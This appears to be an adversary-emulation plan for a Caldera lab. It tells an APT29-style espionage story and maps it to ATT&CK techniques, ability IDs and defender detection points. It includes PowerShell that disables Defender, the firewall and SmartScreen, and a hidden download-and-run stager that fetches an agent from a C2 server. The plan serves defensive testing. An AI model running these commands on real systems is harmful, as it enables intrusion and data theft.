---
type: Adversary Operation
title: "Operation Silent Fog"
description: Nation-state espionage campaign modelled on APT29 — spearphishing a regular workstation, quiet lateral movement to a privileged host, domain compromise, and long-dwell exfiltration.
tags:
  - operation
  - apt29
  - espionage
  - nation-state
  - russia
  - windows
generated:
  by: claude-sonnet-4-6
  at: '2026-07-30T17:00:00Z'
status: stable
---

# Operation Silent Fog

## Story

The target is a mid-size government contractor whose employees regularly receive external emails with project documents. An SVR-linked threat actor — using infrastructure attributed to APT29 — has been collecting open-source intelligence on the company for months. They send a convincing spearphishing email to a junior analyst on **windows-client-11**, disguised as a procurement document from a known partner.

The analyst opens the attachment. A lightweight PowerShell stager fires. The actor spends the next several days quietly mapping the internal environment from the analyst's workstation before escalating privileges, dumping credentials, and pivoting to the senior employee's machine — **windows-the-boss**. From there, with domain user credentials in hand, they reach the **domain controller** (windows-dc). They install a scheduled-task-backed backdoor and begin slow, encrypted exfiltration of Active Directory data and sensitive file shares over the C2 channel — all while clearing traces behind them.

**The story arc:** Low-and-slow. The attacker never trips a loud alert. Every step has a cleanup. Obfuscation is applied throughout.

---

## Narrative

It started with an email.

The sender appeared to be a procurement officer at Northbridge Logistics — a firm the company had worked with for years. The subject line read: *RE: Q3 Contract Review — Updated Terms (Action Required)*. The attachment was a PDF. It looked exactly like every other procurement document that had landed in Maya Chen's inbox that week.

Maya was a junior analyst, three months into the job. It was a Tuesday afternoon. She had seventeen tabs open.

She clicked the link.

Nothing obvious happened. No popup. No error. The document opened cleanly — two pages of contract language she skimmed and forwarded to her manager. She moved on to the next email.

What she didn't see was the PowerShell window that opened and closed in less than a second behind her taskbar. What she didn't hear was the quiet handshake — a small program reaching out across the network, finding its home, and going still.

The actor on the other end had been waiting.

---

They didn't move for eighteen hours. That was deliberate. Noise happens in the first hour — automated scanners, eager operators, mistakes. The SVR had learned patience the hard way. So the implant sat on Maya's workstation through the night, beaconing every few minutes to a rented server in Frankfurt, sending nothing of interest, waiting for daylight in Moscow.

On Wednesday morning, they began to look around.

The workstation was modest — a standard domain member, Windows 11, nothing remarkable. But domain membership was everything. Within the hour they knew the hostname, the OS version, the domain name, every user account on the machine and every group in Active Directory. They found the domain controllers. They found the admin groups. They mapped it all quietly, using tools that had shipped with Windows since 2003.

By Wednesday afternoon, AMSI was disabled. PowerShell history was gone. A scheduled task buried three folders deep in the task library would restart the implant if the machine rebooted. The actor had made a home.

Thursday: credentials. The browser yielded nineteen saved passwords — two of them for internal systems. LSASS gave them the domain hash for a user named *David Okafor, Senior Infrastructure Engineer*. Cached credentials gave them two more. The actor now had keys. Real ones.

---

David Okafor's workstation was in the same building, two floors up. Getting there was a single SMB connection — a file copy to the admin share, a scheduled task, and suddenly there were two implants instead of one. The actor barely paused.

From David's machine, the environment looked different. Larger. They pulled the full AD user list — over four hundred accounts. They found every file share on the network. They enumerated the domain admin group carefully, noting each name.

The domain controller was forty milliseconds away.

PsExec crossed that distance in seconds. The administrator credential from the LSASS dump fit perfectly. A third implant appeared on the domain controller, running as SYSTEM. The actor had gone from a junior analyst's browser tab to the most privileged machine in the organization in seventy-two hours. No alert had fired. No one had noticed.

---

They took their time at the end.

A new domain admin account materialized in Active Directory — named *svc_backup_01*, nondescript, buried among dozens of service accounts. NTDS.dit came out of a Volume Shadow Copy, compressed, password-protected, split across three staged transfers. Three weeks of file share access produced a 4.2 gigabyte archive of project documents, financial models, and personnel records.

The exfiltration was slow. Forty megabytes a day, disguised as normal HTTPS traffic to what appeared to be a cloud storage endpoint. It took eleven days. Nobody watched the egress logs closely enough.

When it was over, the actor cleared every event log on every machine they'd touched — Security, System, Application, wiped clean. Artifacts went into Alternate Data Streams on files that would never be examined. The scheduled tasks were removed. The implants self-deleted.

The Frankfurt server went dark.

Maya Chen never knew. David Okafor never knew. The incident wouldn't be discovered for another four months, when a threat intelligence vendor flagged the svc_backup_01 account in a routine audit.

By then, the data had been in Moscow for sixteen weeks.

---

## ATT&CK Kill Chain

| # | Phase | Tactic | Technique | Description |
|---|---|---|---|---|
| 1 | Foothold | Initial Access | T1566.002 — Spearphishing Link | Analyst clicks link, PowerShell stager executes |
| 2 | Establish Presence | Execution | T1059.001 — PowerShell | Sandcat agent spawned via encoded PS command |
| 3 | Go Quiet | Defense Evasion | T1685 — AMSI Bypass | Disable AMSI to allow subsequent PS scripts |
| 4 | Go Quiet | Defense Evasion | T1070.003 — Clear PS History | Wipe PowerShell transcript and history |
| 5 | Stay Alive | Persistence | T1053.005 — Scheduled Task | Register agent persistence via schtasks.exe |
| 6 | Learn the Land | Discovery | T1082 — System Info | OS version, hostname, domain membership |
| 7 | Learn the Land | Discovery | T1049 — Network Connections | Active connections and listening ports |
| 8 | Learn the Land | Discovery | T1087 — Account Discovery | Local and domain user enumeration |
| 9 | Learn the Land | Discovery | T1069.002 — Domain Groups | Enumerate domain admin groups via Adfind |
| 10 | Learn the Land | Discovery | T1018 — Remote Systems | Discover AD computers and DCs via Adfind |
| 11 | Elevate | Privilege Escalation | T1548.002 — UAC Bypass (Fodhelper) | Elevate to local admin on workstation |
| 12 | Harvest | Credential Access | T1555.003 — Browser Credentials | Steal saved passwords from Chrome/Edge |
| 13 | Harvest | Credential Access | T1003.001 — LSASS Dump | Dump LSASS memory for domain credentials |
| 14 | Harvest | Credential Access | T1003.005 — Cached Creds | Dump cached domain credential hashes |
| 15 | Move | Lateral Movement | T1021.002 — SMB | Copy Sandcat to windows-the-boss via SMB admin share |
| 16 | Re-Establish | Persistence | T1053.005 — Scheduled Task | Persistence on new host |
| 17 | Deeper Recon | Discovery | T1087.002 — Domain Admins | Adfind: enumerate DA accounts and GPOs |
| 18 | Deeper Recon | Discovery | T1087.002 — AD Users | Full AD user object dump |
| 19 | Deeper Recon | Discovery | T1135 — Network Shares | Discover accessible file shares |
| 20 | Move to Crown | Lateral Movement | T1570 — Lateral Tool Transfer | PsExec Sandcat to windows-dc (administrator) |
| 21 | Own the Domain | Persistence | T1136.002 — Domain Admin Account | Create hidden domain admin backdoor account |
| 22 | Own the Domain | Credential Access | T1003.003 — NTDS.dit | Copy NTDS.dit from Volume Shadow Copy |
| 23 | Collect | Collection | T1119 — Automated Collection | Search and stage sensitive files from shares |
| 24 | Collect | Collection | T1560.001 — Archive | Compress staged data with password |
| 25 | Exfil | Exfiltration | T1041 — C2 Channel | Upload archive over existing C2 HTTP channel |
| 26 | Cover Tracks | Defense Evasion | T1070.001 — Clear Event Logs | Wipe Security, System, Application logs on DC |
| 27 | Cover Tracks | Defense Evasion | T1564.004 — ADS | Hide artefacts in Alternate Data Streams |

---

## Pre-Operation Setup

These steps are performed by the operator **before** deploying the Caldera agent. They are not part of the adversary kill chain — they represent lab configuration required to allow the agent to execute without being blocked by host defenses.

Run the following on **every target host** (`windows-client-11`, `windows-the-boss`, `windows-dc`) before starting the operation:

```powershell
# Disable Windows Defender real-time protection and AV
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBlockAtFirstSeen $true

# Disable Windows Defender Firewall (all profiles)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Disable Windows SmartScreen
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name SmartScreenEnabled -Value "Off"
```

> **Note:** These are deliberate lab choices to isolate adversary behavior from defensive noise. In a real engagement these controls would be active and bypassing them would be part of the TTPs.

---

## Caldera Configuration

### Custom Adversary
```json
{
  "adversary_id": "b63f9720-9203-40fc-9d40-1f8fd58167cd",
  "name": "Operation Silent Fog - APT29"
}
```

### Fact Source
```json
{
  "id": "152ca62e-32b6-5c2a-84e8-89fedd44d621",
  "name": "APT29 (Emu)"
}
```
Seed facts needed for this lab (add to source or create custom):

| Trait | Value |
|---|---|
| `remote.host.ip` | `192.168.3.31` (windows-the-boss) |
| `remote.host.ip` | `192.168.1.31` (windows-dc) |
| `domain.user.name` | `lab-user` |
| `domain.user.password` | `Paloalto1!` |
| `domain.user.name` | `administrator` |
| `domain.user.password` | `Paloalto1!` |

### Operation Launch JSON
```json
POST /api/v2/operations
{
  "name": "Operation Silent Fog",
  "adversary": {"adversary_id": "b63f9720-9203-40fc-9d40-1f8fd58167cd"},
  "group": "red",
  "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
  "source": {"id": "a1b2c3d4-0001-0001-0001-000000000001"},
  "obfuscator": "base64jumble",
  "jitter": "5/20",
  "autonomous": 1,
  "auto_close": false,
  "visibility": 51
}
```

### Agent Deployment (Entry Point)
Deploy on **windows-client-11 (192.168.3.32)** as `lab-user`:
```powershell
$url="http://192.168.8.121:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go-windows");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Split("=")[1];[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);Start-Process -FilePath "C:\Users\Public\$name.exe" -ArgumentList "-server http://192.168.8.121:8888 -group red" -WindowStyle Hidden
```

---

## Key Ability IDs (Supplement / Override)

If building a trimmed custom adversary focused on this story:

| Phase | Ability ID | Technique | Name |
|---|---|---|---|
| Execution | `c0177717b47f2cd07949186523fa3c6b` | T1059.001 | PowerShell -Command variations |
| AMSI bypass | `34952e2eefd3066c5f574744e1734ca6` | T1685 | AMSI Bypass - InitFailed |
| Clear PS history | `06889e6e9834c7437235d17396c09336` | T1070.003 | Clear PowerShell Session History |
| Persistence | `fbde845d-6c6c-4a46-9501-be18c3425e43` | T1053.005 | Scheduled Task (schtasks.exe) |
| Network connections | `ba0b398d-91b8-490a-bed2-f959afa8e1aa` | T1049 | Network Connections Discovery |
| Account discovery | `9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76` | T1087 | Account Discovery |
| AD groups | `2afae782-6d0a-4fbd-a6b6-d1ce90090eac` | T1069.002 | Account-type Admin Enumerator |
| AD computers | `c6f643adfd3ed9cf2806bfcb297e0eee` | T1018 | Adfind - AD Computer Objects |
| Find DC | `ab4dc7789a2374e8fc298302e215ab52` | T1018 | Adfind - AD DC Objects |
| UAC bypass | `0c328b7ec82e0074cbb0745db3a53602` | T1548.002 | Bypass UAC via Fodhelper |
| Browser creds | `b267badd4e6f3601450582cb07d9f333` | T1555.003 | BrowserStealer |
| LSASS dump | `473e5707-5786-4f53-934f-22175c1059b0` | T1003.001 | UAC Bypass + Credential Dump |
| Cached creds | `bb0df721f4a4defa743efe9e61837c44` | T1003.005 | Cached Credential Dump |
| Lateral (SMB) | `65048ec1-f7ca-49d3-9410-10813e472b30` | T1021.002 | Copy Sandcat (SMB) |
| Lateral (PsExec) | `620b674a-7655-436c-b645-bc3e8ea51abd` | T1570 | Copy Sandcat via PsExec |
| Domain admin account | `c6bf167afe0b85a1e88127fc0d093e4d` | T1136.002 | Create domain admin user |
| NTDS.dit | `548f5aa3ec2fcfc6872ee10975480f29` | T1003.003 | Copy NTDS.dit from VSS |
| File collection | `10fad81e-3f68-47be-83b6-fbee7711c6a9` | T1119 | Advanced File Search and Stager |
| Archive | `160a1e0f-0f9b-49bb-a0fe-7e362b51737f` | T1560.001 | Archive Collected Data |
| Exfil | `72784d12700b219ec134aa42cec5603e` | T1041 | C2 Data Exfiltration |
| Clear event logs | `fcf71ee3-d1a9-4136-b919-9e5f6da43608` | T1070.001 | Clear Windows Event Logs |
| ADS | `48168a8ea0a186532b156fca59756a64` | T1564.004 | Alternate Data Streams |

---

## Detection Opportunities

| Phase | What a defender would see |
|---|---|
| Foothold | Encoded PS command in parent process chain (Word/Outlook → powershell.exe) |
| AMSI bypass | `amsiInitFailed` reflection or registry key write to `AMSIEnable` |
| Persistence | `schtasks.exe /create` with suspicious binary path |
| Discovery | Adfind.exe or LDAP queries from workstation process |
| Cred dump | LSASS memory access from non-system process |
| Lateral (SMB) | `net use \\host\ADMIN$` + file copy to `ADMIN$` share |
| DC access | Domain admin logon from non-DC host |
| NTDS.dit | Volume shadow copy access from non-backup process |
| Exfil | Repeated large POSTs to single external IP over time |
